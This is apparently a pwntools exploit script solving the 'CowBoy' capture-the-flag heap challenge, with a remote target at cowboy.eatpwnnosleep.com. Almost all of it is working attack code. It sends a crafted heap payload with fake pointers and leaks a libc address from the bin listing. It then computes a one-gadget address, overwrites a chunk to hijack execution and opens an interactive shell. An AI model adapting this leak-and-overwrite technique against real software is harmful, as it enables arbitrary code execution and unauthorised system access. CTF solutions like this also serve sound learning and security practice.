from pwn import *
import sys, json

b = ELF("CowBoy_fb009bfafd91a8c5211c959cc3a5fc7a4ae8ad5d")
#l = ELF("CowBoy_libc_56d992a0342a67a887b8dcaae381d2cc51205253")


def alloc(size):
	p.sendlineafter("exit\n----------------------------------------\n", "1")
	p.recv()
	p.sendline(str(size))
	p.recvuntil(") = 0x")
	return int(p.recvline()[:-1],16)

def fill(binnum, chunknum, data):
        p.sendlineafter("exit\n----------------------------------------\n", "4")
        p.sendline(str(binnum))
        p.sendline(str(chunknum))
        p.send(data)

if len(sys.argv) == 1:
	p = process("./CowBoy_fb009bfafd91a8c5211c959cc3a5fc7a4ae8ad5d")
else:
	p = remote("cowboy.eatpwnnosleep.com", 14697)

payload = "a" * 8
payload += p64(0x602090)
payload += p64(0) * 7
payload += p64(0x4005d0)#b.got['puts'])
payload += "c" * (0x90-8*10)

alloc(0x90)
fill(4,0,payload)
alloc(0x90)

# leak
p.sendlineafter("exit\n----------------------------------------\n", "3")
p.recvuntil("bin[4]: ")
p.recvuntil(" 0x")
p.recvuntil(" 0x")
leak = int(p.recvuntil(" ")[:-1],16)
libc = leak + (0x7ffff7a0d000-0x7ffff7a47f60)
oneshot = libc + 0x45216
log.info("leak = 0x%x" % leak)
log.info("libc = 0x%x" % libc)
log.info("one  = 0x%x" % oneshot)

alloc(0x150)
alloc(0x150)
pause()
fill(5,2,p64(oneshot))
p.interactive()
